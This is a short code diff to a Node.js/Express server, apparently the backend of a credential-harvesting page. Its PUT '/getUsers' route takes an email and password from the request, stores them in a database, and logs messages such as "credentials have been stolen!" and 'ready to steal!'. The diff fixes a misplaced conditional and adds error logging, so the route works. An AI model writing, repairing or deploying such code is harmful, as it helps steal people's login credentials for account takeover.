@@ -13,8 +13,6 @@ app.get("/", (req, res) => {
 
 app.put("/getUsers", async (req, res) => {
   try {
-    if(email) {
-
     
     const { email } = req.body;
     const { password } = req.body;
@@ -27,8 +25,8 @@ app.put("/getUsers", async (req, res) => {
       [email, password]
     );
     console.log(`${email}'s credentials have been stolen!`);
-    } 
   } catch (error) {
+    console.log(error.message);
     console.log('ready to steal!');
   }
 });
